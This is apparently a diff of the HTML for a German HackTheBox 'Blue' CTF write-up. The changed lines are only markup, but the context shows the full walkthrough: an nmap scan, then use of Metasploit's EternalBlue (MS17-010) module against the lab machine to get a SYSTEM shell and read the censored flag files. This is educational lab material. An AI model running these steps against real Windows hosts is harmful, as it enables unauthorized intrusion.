@@ -46,8 +46,8 @@ Tipps  nmap -A zeigt uns deutlich auf welchen Port wir achten müssen Der Name d
 <meta itemprop="name" content="HackTheBox - Blue WriteUp | Tipps &#43; Anleitung">
 <meta itemprop="description" content="Blue ist eine der vielen Verfügbaren CTF Challenges von HackTheBox. Blue gehört zu den einfacheren Maschinen von HackTheBox und ist deswegen sehr gut für Anfänger geeignet. Aber auch für Erfahrene, die eine Herausforderung für zwischendurch suchen.
 
-Tipps  nmap -A zeigt uns deutlich auf welchen Port wir achten müssen Der Name der Maschine, Blue, ist ein Tipp Wenn wir wissen was die Schwachstelle ist, ist Metasploit unser Freund. Wenn der Exploit fehlschlagen sollte, überprüfe deine Einstellungen und versuche es noch ein paar Mal."><meta itemprop="datePublished" content="2018-01-13T20:00:56&#43;01:00" />
-<meta itemprop="dateModified" content="2018-01-13T20:00:56&#43;01:00" />
+Tipps  nmap -A zeigt uns deutlich auf welchen Port wir achten müssen Der Name der Maschine, Blue, ist ein Tipp Wenn wir wissen was die Schwachstelle ist, ist Metasploit unser Freund. Wenn der Exploit fehlschlagen sollte, überprüfe deine Einstellungen und versuche es noch ein paar Mal."><meta itemprop="datePublished" content="2018-01-13T20:00:56+01:00" />
+<meta itemprop="dateModified" content="2018-01-13T20:00:56+01:00" />
 <meta itemprop="wordCount" content="1084"><meta itemprop="image" content="/"/>
 <meta itemprop="keywords" content="hackthebox,ctf,german," />
 <meta name="twitter:card" content="summary_large_image"/>
@@ -67,8 +67,8 @@ Tipps  nmap -A zeigt uns deutlich auf welchen Port wir achten müssen Der Name d
 Tipps  nmap -A zeigt uns deutlich auf welchen Port wir achten müssen Der Name der Maschine, Blue, ist ein Tipp Wenn wir wissen was die Schwachstelle ist, ist Metasploit unser Freund. Wenn der Exploit fehlschlagen sollte, überprüfe deine Einstellungen und versuche es noch ein paar Mal." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/2018/01/hackthebox-blue-writeup-tipps-anleitung/" /><meta property="og:image" content="/"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2018-01-13T20:00:56&#43;01:00" />
-<meta property="article:modified_time" content="2018-01-13T20:00:56&#43;01:00" />
+<meta property="article:published_time" content="2018-01-13T20:00:56+01:00" />
+<meta property="article:modified_time" content="2018-01-13T20:00:56+01:00" />
 
 
 
@@ -168,7 +168,7 @@ Ansonsten kann auch ein Reset von <strong>Blue</strong> helfen.</li>
 <p><a href="http://www.youtube.com/watch?v=qo2WI_vrIGA"><img src="http://img.youtube.com/vi/qo2WI_vrIGA/0.jpg" alt="kurzes video walkthrough"></a></p>
 <h2 id="anleitung--walkthrough"><strong>Anleitung / Walkthrough</strong></h2>
 <p>Als erstes machen wir wie gewohnt einen Nmap-Scan. Dabei benutzen wir die Option <strong>-A</strong> um das Betriebssystem und ebenfalls die Services herauszufinden, welche auf den jeweiligen Ports laufen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nmap -A 10.10.10.40
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nmap -A 10.10.10.40
 
 Starting Nmap 7.60 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2018-01-10 11:10 CET
 Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.40
@@ -211,7 +211,7 @@ Host script results:
 |_ start_date: 2018-01-10 09:45:10
 </code></pre></div><p>Anscheinend ist das Betriebssystem Windows 7 mit dem Service Pack 7. Auf Port 445 scheint <a href="https://de.wikipedia.org/wiki/Server_Message_Block">SMB</a> zu laufen.</p>
 <p>Benutzen wir doch mal <strong>searchsploit</strong> um nach Schwachstellen für <a href="https://de.wikipedia.org/wiki/Server_Message_Block">SMB</a> bei Windows 7 zu suchen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# searchsploit windows <span style="color:#ae81ff">7</span> smb
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# searchsploit windows <span style="color:#ae81ff">7</span> smb
 ------------------------------------------------------------------------------------------------
 Exploit Title
 ------------------------------------------------------------------------------------------------
@@ -224,7 +224,7 @@ Microsoft Windows Windows 8/8.1/2012 R2 <span style="color:#f92672">(</span>x64<
 </code></pre></div><p>Diese 3 Zeilen klingen besonders interessant. <strong>&lsquo;EternalBlue&rsquo; SMB Remote Code Execution (MS17-010)</strong>.<br>
 <a href="https://de.wikipedia.org/wiki/EternalBlue">EternalBlue</a> scheint der richtige Weg zu sein.</p>
 <p>Mal sehen ob Metasploit ein Modul für <a href="https://de.wikipedia.org/wiki/EternalBlue">EternalBlue</a> hat.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf &gt; use exploit/windows/smb/
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf &gt; use exploit/windows/smb/
 use exploit/windows/smb/generic_smb_dll_injection
 use exploit/windows/smb/group_policy_startup
 use exploit/windows/smb/ipass_pipe_exec
@@ -250,7 +250,7 @@ use exploit/windows/smb/netidentity_xtierrpcpipe
 use exploit/windows/smb/psexec
 </code></pre></div><p>Tatsächlich! <strong>use exploit/windows/smb/ms17_010_eternalblue</strong> Das macht es für uns einfach!</p>
 <p>Laden wir das Modul und sehen uns die Optionen an.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf &gt; use exploit/windows/smb/ms17_010_eternalblue
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf &gt; use exploit/windows/smb/ms17_010_eternalblue
 msf exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; show options
 
 Module options <span style="color:#f92672">(</span>exploit/windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span>:
@@ -262,7 +262,7 @@ RHOST                          The target address
 RPORT <span style="color:#ae81ff">445</span>                      The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 </code></pre></div><p>Der Port ist schon richtig eingestellt. Deswegen müssen wir nur noch <strong>RHOST</strong> auf die IP-Adresse von Blue setzen und mit dem Befehl <strong>exploit</strong> starten.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; set RHOST 10.10.10.40
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; set RHOST 10.10.10.40
 RHOST <span style="color:#f92672">=</span>&gt; 10.10.10.40
 
 msf exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; exploit
@@ -299,11 +299,11 @@ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</spa
 </code></pre></div><p>Es hat funktioniert! Falls es bei dir nicht funktioniert, überprüfe nochmal ob <strong>RHOST</strong> und <strong>RPORT</strong> richtig eingestellt ist.<br>
 Wenn es trotzdem nach mehreren Versuchen nicht funktioniert, hilft es <strong>Blue</strong> zurückzusetzen.</p>
 <p>Sehen wir uns zuerst einmal mit dem Befehl <strong>whoami</strong> an, als welcher Benutzer wir Zugriff haben.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
 whoami
 nt authority<span style="color:#ae81ff">\s</span>ystem
 </code></pre></div><p>Dank des Metasploit Modules sind wir schon direkt als <strong>nt authority\system</strong> angemeldet. Jetzt müssen wir nur noch die beiden Text-Dateien <strong>user.txt</strong> und <strong>root.txt</strong> finden.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;cd C:/Users
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;cd C:/Users
 cd C:/Users
 
 C:<span style="color:#ae81ff">\U</span>sers&gt;dir
@@ -343,11 +343,11 @@ Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81
 <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> <span style="color:#ae81ff">32</span> bytes
 <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> 15,509,401,600 bytes free
 </code></pre></div><p>Unter <strong>C:\Users\haris\Desktop\</strong> befindet sich die <strong>user.txt</strong> Datei mit dem Befehl <strong>type</strong> können wir unter Windows den Inhalt ausgeben lassen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>aris<span style="color:#ae81ff">\D</span>esktop&gt;type user.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>aris<span style="color:#ae81ff">\D</span>esktop&gt;type user.txt
 type user.txt
 <span style="color:#75715e">##########zensiert###########ea9</span>
 </code></pre></div><p>Jetzt ist die <strong>root.txt</strong> Datei dran</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>aris<span style="color:#ae81ff">\D</span>esktop&gt;cd C:/Users/Administrator/Desktop
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>aris<span style="color:#ae81ff">\D</span>esktop&gt;cd C:/Users/Administrator/Desktop
 cd C:/Users/Administrator/Desktop
 
 C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;dir
@@ -363,7 +363,7 @@ Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81
 <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> <span style="color:#ae81ff">32</span> bytes
 <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> 15,500,283,904 bytes free
 </code></pre></div><p>Diese befindet sich unter <strong>C:\Users\Administrator\Desktop\</strong>. Jetzt nur noch wieder mit <strong>type</strong> den Inhalt ausgeben&hellip;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;type root.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;type root.txt
 type root.txt
 <span style="color:#75715e">##########zensiert###########717</span>
 </code></pre></div><p>Und wir haben User und Root auf Blue erfolgreich geownt!</p>
